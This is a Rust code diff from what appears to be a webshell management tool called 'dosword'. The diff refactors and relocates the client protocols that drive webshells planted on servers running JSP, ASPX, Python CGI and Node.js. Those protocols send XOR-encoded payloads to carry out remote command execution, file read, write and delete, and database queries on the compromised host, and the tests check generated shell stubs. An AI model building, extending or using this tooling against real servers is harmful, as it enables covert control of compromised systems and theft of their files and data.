@@ -8,8 +8,8 @@ use base64::Engine;
 use url::Url;
 
 use dosword_sdk::domain::{
-    AppSettings, CommandOutput, ConnectResult, DbConnection, DbProbeResult, DbQueryResult,
-    DirListing, FileContent, ProbeResult, ShellProfile,
+    AppSettings, CommandOutput, DbConnection, DbProbeResult, DbQueryResult, DirListing,
+    ProbeResult, ShellProfile,
 };
 use dosword_sdk::encoder::{NativeEncoder, PayloadEncoder, md5_hex};
 
@@ -38,17 +38,7 @@ impl SessionState for JspSession {
 }
 
 fn build_client(settings: &AppSettings) -> reqwest::blocking::Client {
-    let mut builder = reqwest::blocking::Client::builder()
-        .timeout(std::time::Duration::from_secs(
-            settings.default_timeout_secs as u64,
-        ))
-        .redirect(reqwest::redirect::Policy::none());
-    if let Some(proxy) = &settings.proxy {
-        if let Ok(proxy) = reqwest::Proxy::all(proxy) {
-            builder = builder.proxy(proxy);
-        }
-    }
-    builder.build().unwrap_or_default()
+    crate::protocol::transport::build_client(settings)
 }
 
 /// 构造会话（XOR 编码器固定）。
@@ -147,7 +137,8 @@ fn form_call(
         .get("data")
         .and_then(|v| v.as_str())
         .ok_or_else(|| ProtocolError::ParseError("响应缺少 data 字段".to_string()))?;
-    let plain = session.encoder.decode(data, &session.password)?;
+    let data = crate::protocol::transport::gunzip_if_needed(data);
+    let plain = session.encoder.decode(&data, &session.password)?;
     let value: serde_json::Value = serde_json::from_slice(&plain)
         .map_err(|_| ProtocolError::ParseError("响应内容不是合法 JSON".to_string()))?;
     if value.get("ok").and_then(|v| v.as_bool()) != Some(true) {
@@ -162,12 +153,11 @@ fn form_call(
 
 /// 缓存环境信息（current_dir / separator），供文件操作。
 fn ensure_info(session: &JspSession, settings: &AppSettings) -> Result<ProbeResult, ProtocolError> {
-    if let Ok(guard) = session.info.lock() {
-        if let Some(info) = guard.as_ref() {
-            if !info.current_dir.is_empty() {
-                return Ok(info.clone());
-            }
-        }
+    if let Ok(guard) = session.info.lock()
+        && let Some(info) = guard.as_ref()
+        && !info.current_dir.is_empty()
+    {
+        return Ok(info.clone());
     }
     let value = form_call(session, "probe", &[], settings)?;
     let info = ProbeResult {
@@ -261,7 +251,7 @@ impl Protocol for JvmLikeProtocol {
         let jsp = session
             .as_any()
             .downcast_ref::<JspSession>()
-            .expect("会话类型不匹配");
+            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
         let w = jsp.cwd.lock().map(|c| c.clone()).unwrap_or_default();
         let value = form_call(jsp, "exec", &[("c", command), ("w", &w)], settings)?;
         let stdout = value
@@ -276,10 +266,10 @@ impl Protocol for JvmLikeProtocol {
             .and_then(|v| v.as_str())
             .unwrap_or("")
             .to_string();
-        if !cwd.is_empty() {
-            if let Ok(mut slot) = jsp.cwd.lock() {
-                *slot = cwd.clone();
-            }
+        if !cwd.is_empty()
+            && let Ok(mut slot) = jsp.cwd.lock()
+        {
+            *slot = cwd.clone();
         }
         Ok(CommandOutput {
             stdout: String::from_utf8_lossy(&decoded).into_owned(),
@@ -298,7 +288,7 @@ impl Protocol for JvmLikeProtocol {
         let jsp = session
             .as_any()
             .downcast_ref::<JspSession>()
-            .expect("会话类型不匹配");
+            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
         let info = ensure_info(jsp, settings)?;
         let value = form_call(jsp, "list", &[("p", path)], settings)?;
         let mut entries = Vec::new();
@@ -342,7 +332,7 @@ impl Protocol for JvmLikeProtocol {
         let jsp = session
             .as_any()
             .downcast_ref::<JspSession>()
-            .expect("会话类型不匹配");
+            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
         let value = form_call(jsp, "read", &[("p", path)], settings)?;
         let data = value
             .pointer("/data")
@@ -363,14 +353,9 @@ impl Protocol for JvmLikeProtocol {
         let jsp = session
             .as_any()
             .downcast_ref::<JspSession>()
-            .expect("会话类型不匹配");
+            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
         let data = base64::engine::general_purpose::STANDARD.encode(content);
-        form_call(
-            jsp,
-            "write",
-            &[("p", path), ("d", &data)],
-            settings,
-        )?;
+        form_call(jsp, "write", &[("p", path), ("d", &data)], settings)?;
         Ok(())
     }
 
@@ -386,7 +371,7 @@ impl Protocol for JvmLikeProtocol {
         let jsp = session
             .as_any()
             .downcast_ref::<JspSession>()
-            .expect("会话类型不匹配");
+            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
         let value = form_call(
             jsp,
             "read",
@@ -427,7 +412,7 @@ impl Protocol for JvmLikeProtocol {
         let jsp = session
             .as_any()
             .downcast_ref::<JspSession>()
-            .expect("会话类型不匹配");
+            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
         let b64 = base64::engine::general_purpose::STANDARD.encode(content);
         form_call(
             jsp,
@@ -447,13 +432,8 @@ impl Protocol for JvmLikeProtocol {
         let jsp = session
             .as_any()
             .downcast_ref::<JspSession>()
-            .expect("会话类型不匹配");
-        let value = form_call(
-            jsp,
-            "dbprobe",
-            &[("c", &conn_json(connection))],
-            settings,
-        )?;
+            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
+        let value = form_call(jsp, "dbprobe", &[("c", &conn_json(connection))], settings)?;
         let databases = value
             .pointer("/data/databases")
             .and_then(|v| v.as_array())
@@ -481,7 +461,7 @@ impl Protocol for JvmLikeProtocol {
         let jsp = session
             .as_any()
             .downcast_ref::<JspSession>()
-            .expect("会话类型不匹配");
+            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
         let value = form_call(
             jsp,
             "dbquery",
@@ -544,7 +524,7 @@ impl Protocol for JvmLikeProtocol {
         let jsp = session
             .as_any()
             .downcast_ref::<JspSession>()
-            .expect("会话类型不匹配");
+            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
         form_call(jsp, "delete", &[("p", path)], settings)?;
         Ok(())
     }
@@ -559,13 +539,8 @@ impl Protocol for JvmLikeProtocol {
         let jsp = session
             .as_any()
             .downcast_ref::<JspSession>()
-            .expect("会话类型不匹配");
-        form_call(
-            jsp,
-            "rename",
-            &[("f", from), ("t", to)],
-            settings,
-        )?;
+            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
+        form_call(jsp, "rename", &[("f", from), ("t", to)], settings)?;
         Ok(())
     }
 
@@ -578,7 +553,7 @@ impl Protocol for JvmLikeProtocol {
         let jsp = session
             .as_any()
             .downcast_ref::<JspSession>()
-            .expect("会话类型不匹配");
+            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
         form_call(jsp, "mkdir", &[("p", path)], settings)?;
         Ok(())
     }
@@ -1045,6 +1020,385 @@ impl dosword_sdk::ProtocolPlugin for AspNetProtocol {
     }
 }
 
+// ---------------------------------------------------------------------------
+// Python / Node.js：复用 JvmLikeProtocol 通信格式（formData XOR + X-Debug-Key）
+// ---------------------------------------------------------------------------
+
+pub struct PythonProtocol;
+
+impl Protocol for PythonProtocol {
+    fn id(&self) -> &'static str {
+        "builtin.python.v1"
+    }
+
+    fn display_name(&self) -> &'static str {
+        "Python（XOR 载荷）"
+    }
+
+    fn requires_network(&self) -> bool {
+        true
+    }
+
+    fn probe(
+        &self,
+        profile: &ShellProfile,
+        settings: &AppSettings,
+    ) -> Result<ProbeResult, ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.python.v1",
+            display_name: "",
+        }
+        .probe(profile, settings)
+    }
+
+    fn connect(
+        &self,
+        profile: &ShellProfile,
+        settings: &AppSettings,
+    ) -> Result<(Box<dyn SessionState>, ProbeResult), ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.python.v1",
+            display_name: "",
+        }
+        .connect(profile, settings)
+    }
+
+    fn execute_command(
+        &self,
+        session: &dyn SessionState,
+        command: &str,
+        settings: &AppSettings,
+    ) -> Result<CommandOutput, ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.python.v1",
+            display_name: "",
+        }
+        .execute_command(session, command, settings)
+    }
+
+    fn list_dir(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        settings: &AppSettings,
+    ) -> Result<DirListing, ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.python.v1",
+            display_name: "",
+        }
+        .list_dir(session, path, settings)
+    }
+
+    fn read_file(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        settings: &AppSettings,
+    ) -> Result<Vec<u8>, ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.python.v1",
+            display_name: "",
+        }
+        .read_file(session, path, settings)
+    }
+
+    fn write_file(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        content: &[u8],
+        settings: &AppSettings,
+    ) -> Result<(), ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.python.v1",
+            display_name: "",
+        }
+        .write_file(session, path, content, settings)
+    }
+
+    fn delete_path(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        settings: &AppSettings,
+    ) -> Result<(), ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.python.v1",
+            display_name: "",
+        }
+        .delete_path(session, path, settings)
+    }
+
+    fn rename_path(
+        &self,
+        session: &dyn SessionState,
+        from: &str,
+        to: &str,
+        settings: &AppSettings,
+    ) -> Result<(), ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.python.v1",
+            display_name: "",
+        }
+        .rename_path(session, from, to, settings)
+    }
+
+    fn create_dir(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        settings: &AppSettings,
+    ) -> Result<(), ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.python.v1",
+            display_name: "",
+        }
+        .create_dir(session, path, settings)
+    }
+
+    fn touch_path(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        timestamp: u64,
+        settings: &AppSettings,
+    ) -> Result<(), ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.python.v1",
+            display_name: "",
+        }
+        .touch_path(session, path, timestamp, settings)
+    }
+
+    fn db_probe(
+        &self,
+        session: &dyn SessionState,
+        connection: &DbConnection,
+        settings: &AppSettings,
+    ) -> Result<DbProbeResult, ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.python.v1",
+            display_name: "",
+        }
+        .db_probe(session, connection, settings)
+    }
+
+    fn db_query(
+        &self,
+        session: &dyn SessionState,
+        connection: &DbConnection,
+        sql: &str,
+        settings: &AppSettings,
+    ) -> Result<DbQueryResult, ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.python.v1",
+            display_name: "",
+        }
+        .db_query(session, connection, sql, settings)
+    }
+}
+
+impl dosword_sdk::ProtocolPlugin for PythonProtocol {
+    fn manifest(&self) -> dosword_sdk::PluginManifest {
+        dosword_sdk::PluginManifest {
+            id: self.id().to_string(),
+            name: self.display_name().to_string(),
+            version: env!("CARGO_PKG_VERSION").to_string(),
+            kind: dosword_sdk::PluginKind::Protocol,
+            description: "Python WebShell（CGI）：命令执行、文件管理（XOR 载荷）。".to_string(),
+            capabilities: vec!["files".into(), "terminal".into()],
+        }
+    }
+}
+
+pub struct NodeProtocol;
+
+impl Protocol for NodeProtocol {
+    fn id(&self) -> &'static str {
+        "builtin.node.v1"
+    }
+
+    fn display_name(&self) -> &'static str {
+        "Node.js（XOR 载荷）"
+    }
+
+    fn requires_network(&self) -> bool {
+        true
+    }
+
+    fn probe(
+        &self,
+        profile: &ShellProfile,
+        settings: &AppSettings,
+    ) -> Result<ProbeResult, ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.node.v1",
+            display_name: "",
+        }
+        .probe(profile, settings)
+    }
+
+    fn connect(
+        &self,
+        profile: &ShellProfile,
+        settings: &AppSettings,
+    ) -> Result<(Box<dyn SessionState>, ProbeResult), ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.node.v1",
+            display_name: "",
+        }
+        .connect(profile, settings)
+    }
+
+    fn execute_command(
+        &self,
+        session: &dyn SessionState,
+        command: &str,
+        settings: &AppSettings,
+    ) -> Result<CommandOutput, ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.node.v1",
+            display_name: "",
+        }
+        .execute_command(session, command, settings)
+    }
+
+    fn list_dir(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        settings: &AppSettings,
+    ) -> Result<DirListing, ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.node.v1",
+            display_name: "",
+        }
+        .list_dir(session, path, settings)
+    }
+
+    fn read_file(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        settings: &AppSettings,
+    ) -> Result<Vec<u8>, ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.node.v1",
+            display_name: "",
+        }
+        .read_file(session, path, settings)
+    }
+
+    fn write_file(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        content: &[u8],
+        settings: &AppSettings,
+    ) -> Result<(), ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.node.v1",
+            display_name: "",
+        }
+        .write_file(session, path, content, settings)
+    }
+
+    fn delete_path(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        settings: &AppSettings,
+    ) -> Result<(), ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.node.v1",
+            display_name: "",
+        }
+        .delete_path(session, path, settings)
+    }
+
+    fn rename_path(
+        &self,
+        session: &dyn SessionState,
+        from: &str,
+        to: &str,
+        settings: &AppSettings,
+    ) -> Result<(), ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.node.v1",
+            display_name: "",
+        }
+        .rename_path(session, from, to, settings)
+    }
+
+    fn create_dir(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        settings: &AppSettings,
+    ) -> Result<(), ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.node.v1",
+            display_name: "",
+        }
+        .create_dir(session, path, settings)
+    }
+
+    fn touch_path(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        timestamp: u64,
+        settings: &AppSettings,
+    ) -> Result<(), ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.node.v1",
+            display_name: "",
+        }
+        .touch_path(session, path, timestamp, settings)
+    }
+
+    fn db_probe(
+        &self,
+        session: &dyn SessionState,
+        connection: &DbConnection,
+        settings: &AppSettings,
+    ) -> Result<DbProbeResult, ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.node.v1",
+            display_name: "",
+        }
+        .db_probe(session, connection, settings)
+    }
+
+    fn db_query(
+        &self,
+        session: &dyn SessionState,
+        connection: &DbConnection,
+        sql: &str,
+        settings: &AppSettings,
+    ) -> Result<DbQueryResult, ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.node.v1",
+            display_name: "",
+        }
+        .db_query(session, connection, sql, settings)
+    }
+}
+
+impl dosword_sdk::ProtocolPlugin for NodeProtocol {
+    fn manifest(&self) -> dosword_sdk::PluginManifest {
+        dosword_sdk::PluginManifest {
+            id: self.id().to_string(),
+            name: self.display_name().to_string(),
+            version: env!("CARGO_PKG_VERSION").to_string(),
+            kind: dosword_sdk::PluginKind::Protocol,
+            description: "Node.js WebShell（独立 HTTP 服务）：命令执行、文件管理（XOR 载荷）。"
+                .to_string(),
+            capabilities: vec!["files".into(), "terminal".into()],
+        }
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -1111,7 +1465,7 @@ HTTPServer(("127.0.0.1", port), Hd).serve_forever()
             chunk_size_mb: 4,
             allow_arbitrary_code: true,
             audit_retention_days: 90,
-        gzip_enabled: true,
+            gzip_enabled: true,
         }
     }
 
@@ -1303,12 +1657,25 @@ HTTPServer(("127.0.0.1", port), Hd).serve_forever()
                 dbname: Some(db_file.clone()),
             };
             let probe = protocol.db_probe(session.as_ref(), &conn, &settings)?;
-            assert!(probe.databases.contains(&"main".to_string()), "{:?}", probe.databases);
-            protocol
-                .db_query(session.as_ref(), &conn, "CREATE TABLE IF NOT EXISTS t (id INTEGER, name TEXT)", &settings)?;
-            protocol
-                .db_query(session.as_ref(), &conn, "INSERT INTO t VALUES (1, 'dosword')", &settings)?;
-            let q = protocol.db_query(session.as_ref(), &conn, "SELECT id, name FROM t", &settings)?;
+            assert!(
+                probe.databases.contains(&"main".to_string()),
+                "{:?}",
+                probe.databases
+            );
+            protocol.db_query(
+                session.as_ref(),
+                &conn,
+                "CREATE TABLE IF NOT EXISTS t (id INTEGER, name TEXT)",
+                &settings,
+            )?;
+            protocol.db_query(
+                session.as_ref(),
+                &conn,
+                "INSERT INTO t VALUES (1, 'dosword')",
+                &settings,
+            )?;
+            let q =
+                protocol.db_query(session.as_ref(), &conn, "SELECT id, name FROM t", &settings)?;
             assert_eq!(q.columns, vec!["id".to_string(), "name".to_string()]);
             assert_eq!(q.rows.len(), 1);
             assert_eq!(q.rows[0][1].as_deref(), Some("dosword"));
@@ -1394,11 +1761,20 @@ HTTPServer(("127.0.0.1", port), Hd).serve_forever()
             };
             let probe = protocol.db_probe(session.as_ref(), &conn, &settings)?;
             assert!(!probe.databases.is_empty(), "{:?}", probe.databases);
-            protocol
-                .db_query(session.as_ref(), &conn, "CREATE TABLE IF NOT EXISTS t (id INTEGER, name TEXT)", &settings)?;
-            protocol
-                .db_query(session.as_ref(), &conn, "INSERT INTO t VALUES (1, 'node')", &settings)?;
-            let q = protocol.db_query(session.as_ref(), &conn, "SELECT id, name FROM t", &settings)?;
+            protocol.db_query(
+                session.as_ref(),
+                &conn,
+                "CREATE TABLE IF NOT EXISTS t (id INTEGER, name TEXT)",
+                &settings,
+            )?;
+            protocol.db_query(
+                session.as_ref(),
+                &conn,
+                "INSERT INTO t VALUES (1, 'node')",
+                &settings,
+            )?;
+            let q =
+                protocol.db_query(session.as_ref(), &conn, "SELECT id, name FROM t", &settings)?;
             assert_eq!(q.columns, vec!["id".to_string(), "name".to_string()]);
             assert_eq!(q.rows.len(), 1);
             assert_eq!(q.rows[0][1].as_deref(), Some("node"));
@@ -1423,372 +1799,5 @@ HTTPServer(("127.0.0.1", port), Hd).serve_forever()
             .stub("aspx", "secret")
             .unwrap();
         assert!(aspx.contains("Process.Start"));
-    }
-}
-
-// ---------------------------------------------------------------------------
-// Python / Node.js：复用 JvmLikeProtocol 通信格式（formData XOR + X-Debug-Key）
-// ---------------------------------------------------------------------------
-
-pub struct PythonProtocol;
-
-impl Protocol for PythonProtocol {
-    fn id(&self) -> &'static str {
-        "builtin.python.v1"
-    }
-
-    fn display_name(&self) -> &'static str {
-        "Python（XOR 载荷）"
-    }
-
-    fn requires_network(&self) -> bool {
-        true
-    }
-
-    fn probe(
-        &self,
-        profile: &ShellProfile,
-        settings: &AppSettings,
-    ) -> Result<ProbeResult, ProtocolError> {
-        JvmLikeProtocol {
-            id: "builtin.python.v1",
-            display_name: "",
-        }
-        .probe(profile, settings)
-    }
-
-    fn connect(
-        &self,
-        profile: &ShellProfile,
-        settings: &AppSettings,
-    ) -> Result<(Box<dyn SessionState>, ProbeResult), ProtocolError> {
-        JvmLikeProtocol {
-            id: "builtin.python.v1",
-            display_name: "",
-        }
-        .connect(profile, settings)
-    }
-
-    fn execute_command(
-        &self,
-        session: &dyn SessionState,
-        command: &str,
-        settings: &AppSettings,
-    ) -> Result<CommandOutput, ProtocolError> {
-        JvmLikeProtocol {
-            id: "builtin.python.v1",
-            display_name: "",
-        }
-        .execute_command(session, command, settings)
-    }
-
-    fn list_dir(
-        &self,
-        session: &dyn SessionState,
-        path: &str,
-        settings: &AppSettings,
-    ) -> Result<DirListing, ProtocolError> {
-        JvmLikeProtocol {
-            id: "builtin.python.v1",
-            display_name: "",
-        }
-        .list_dir(session, path, settings)
-    }
-
-    fn read_file(
-        &self,
-        session: &dyn SessionState,
-        path: &str,
-        settings: &AppSettings,
-    ) -> Result<Vec<u8>, ProtocolError> {
-        JvmLikeProtocol {
-            id: "builtin.python.v1",
-            display_name: "",
-        }
-        .read_file(session, path, settings)
-    }
-
-    fn write_file(
-        &self,
-        session: &dyn SessionState,
-        path: &str,
-        content: &[u8],
-        settings: &AppSettings,
-    ) -> Result<(), ProtocolError> {
-        JvmLikeProtocol {
-            id: "builtin.python.v1",
-            display_name: "",
-        }
-        .write_file(session, path, content, settings)
-    }
-
-    fn delete_path(
-        &self,
-        session: &dyn SessionState,
-        path: &str,
-        settings: &AppSettings,
-    ) -> Result<(), ProtocolError> {
-        JvmLikeProtocol {
-            id: "builtin.python.v1",
-            display_name: "",
-        }
-        .delete_path(session, path, settings)
-    }
-
-    fn rename_path(
-        &self,
-        session: &dyn SessionState,
-        from: &str,
-        to: &str,
-        settings: &AppSettings,
-    ) -> Result<(), ProtocolError> {
-        JvmLikeProtocol {
-            id: "builtin.python.v1",
-            display_name: "",
-        }
-        .rename_path(session, from, to, settings)
-    }
-
-    fn create_dir(
-        &self,
-        session: &dyn SessionState,
-        path: &str,
-        settings: &AppSettings,
-    ) -> Result<(), ProtocolError> {
-        JvmLikeProtocol {
-            id: "builtin.python.v1",
-            display_name: "",
-        }
-        .create_dir(session, path, settings)
-    }
-
-    fn touch_path(
-        &self,
-        session: &dyn SessionState,
-        path: &str,
-        timestamp: u64,
-        settings: &AppSettings,
-    ) -> Result<(), ProtocolError> {
-        JvmLikeProtocol {
-            id: "builtin.python.v1",
-            display_name: "",
-        }
-        .touch_path(session, path, timestamp, settings)
-    }
-
-    fn db_probe(
-        &self,
-        session: &dyn SessionState,
-        connection: &DbConnection,
-        settings: &AppSettings,
-    ) -> Result<DbProbeResult, ProtocolError> {
-        JvmLikeProtocol { id: "builtin.python.v1", display_name: "" }
-            .db_probe(session, connection, settings)
-    }
-
-    fn db_query(
-        &self,
-        session: &dyn SessionState,
-        connection: &DbConnection,
-        sql: &str,
-        settings: &AppSettings,
-    ) -> Result<DbQueryResult, ProtocolError> {
-        JvmLikeProtocol { id: "builtin.python.v1", display_name: "" }
-            .db_query(session, connection, sql, settings)
-    }
-}
-
-impl dosword_sdk::ProtocolPlugin for PythonProtocol {
-    fn manifest(&self) -> dosword_sdk::PluginManifest {
-        dosword_sdk::PluginManifest {
-            id: self.id().to_string(),
-            name: self.display_name().to_string(),
-            version: env!("CARGO_PKG_VERSION").to_string(),
-            kind: dosword_sdk::PluginKind::Protocol,
-            description: "Python WebShell（CGI）：命令执行、文件管理（XOR 载荷）。".to_string(),
-            capabilities: vec!["files".into(), "terminal".into()],
-        }
-    }
-}
-
-pub struct NodeProtocol;
-
-impl Protocol for NodeProtocol {
-    fn id(&self) -> &'static str {
-        "builtin.node.v1"
-    }
-
-    fn display_name(&self) -> &'static str {
-        "Node.js（XOR 载荷）"
-    }
-
-    fn requires_network(&self) -> bool {
-        true
-    }
-
-    fn probe(
-        &self,
-        profile: &ShellProfile,
-        settings: &AppSettings,
-    ) -> Result<ProbeResult, ProtocolError> {
-        JvmLikeProtocol {
-            id: "builtin.node.v1",
-            display_name: "",
-        }
-        .probe(profile, settings)
-    }
-
-    fn connect(
-        &self,
-        profile: &ShellProfile,
-        settings: &AppSettings,
-    ) -> Result<(Box<dyn SessionState>, ProbeResult), ProtocolError> {
-        JvmLikeProtocol {
-            id: "builtin.node.v1",
-            display_name: "",
-        }
-        .connect(profile, settings)
-    }
-
-    fn execute_command(
-        &self,
-        session: &dyn SessionState,
-        command: &str,
-        settings: &AppSettings,
-    ) -> Result<CommandOutput, ProtocolError> {
-        JvmLikeProtocol {
-            id: "builtin.node.v1",
-            display_name: "",
-        }
-        .execute_command(session, command, settings)
-    }
-
-    fn list_dir(
-        &self,
-        session: &dyn SessionState,
-        path: &str,
-        settings: &AppSettings,
-    ) -> Result<DirListing, ProtocolError> {
-        JvmLikeProtocol {
-            id: "builtin.node.v1",
-            display_name: "",
-        }
-        .list_dir(session, path, settings)
-    }
-
-    fn read_file(
-        &self,
-        session: &dyn SessionState,
-        path: &str,
-        settings: &AppSettings,
-    ) -> Result<Vec<u8>, ProtocolError> {
-        JvmLikeProtocol {
-            id: "builtin.node.v1",
-            display_name: "",
-        }
-        .read_file(session, path, settings)
-    }
-
-    fn write_file(
-        &self,
-        session: &dyn SessionState,
-        path: &str,
-        content: &[u8],
-        settings: &AppSettings,
-    ) -> Result<(), ProtocolError> {
-        JvmLikeProtocol {
-            id: "builtin.node.v1",
-            display_name: "",
-        }
-        .write_file(session, path, content, settings)
-    }
-
-    fn delete_path(
-        &self,
-        session: &dyn SessionState,
-        path: &str,
-        settings: &AppSettings,
-    ) -> Result<(), ProtocolError> {
-        JvmLikeProtocol {
-            id: "builtin.node.v1",
-            display_name: "",
-        }
-        .delete_path(session, path, settings)
-    }
-
-    fn rename_path(
-        &self,
-        session: &dyn SessionState,
-        from: &str,
-        to: &str,
-        settings: &AppSettings,
-    ) -> Result<(), ProtocolError> {
-        JvmLikeProtocol {
-            id: "builtin.node.v1",
-            display_name: "",
-        }
-        .rename_path(session, from, to, settings)
-    }
-
-    fn create_dir(
-        &self,
-        session: &dyn SessionState,
-        path: &str,
-        settings: &AppSettings,
-    ) -> Result<(), ProtocolError> {
-        JvmLikeProtocol {
-            id: "builtin.node.v1",
-            display_name: "",
-        }
-        .create_dir(session, path, settings)
-    }
-
-    fn touch_path(
-        &self,
-        session: &dyn SessionState,
-        path: &str,
-        timestamp: u64,
-        settings: &AppSettings,
-    ) -> Result<(), ProtocolError> {
-        JvmLikeProtocol {
-            id: "builtin.node.v1",
-            display_name: "",
-        }
-        .touch_path(session, path, timestamp, settings)
-    }
-
-    fn db_probe(
-        &self,
-        session: &dyn SessionState,
-        connection: &DbConnection,
-        settings: &AppSettings,
-    ) -> Result<DbProbeResult, ProtocolError> {
-        JvmLikeProtocol { id: "builtin.node.v1", display_name: "" }
-            .db_probe(session, connection, settings)
-    }
-
-    fn db_query(
-        &self,
-        session: &dyn SessionState,
-        connection: &DbConnection,
-        sql: &str,
-        settings: &AppSettings,
-    ) -> Result<DbQueryResult, ProtocolError> {
-        JvmLikeProtocol { id: "builtin.node.v1", display_name: "" }
-            .db_query(session, connection, sql, settings)
-    }
-}
-
-impl dosword_sdk::ProtocolPlugin for NodeProtocol {
-    fn manifest(&self) -> dosword_sdk::PluginManifest {
-        dosword_sdk::PluginManifest {
-            id: self.id().to_string(),
-            name: self.display_name().to_string(),
-            version: env!("CARGO_PKG_VERSION").to_string(),
-            kind: dosword_sdk::PluginKind::Protocol,
-            description: "Node.js WebShell（独立 HTTP 服务）：命令执行、文件管理（XOR 载荷）。"
-                .to_string(),
-            capabilities: vec!["files".into(), "terminal".into()],
-        }
     }
 }
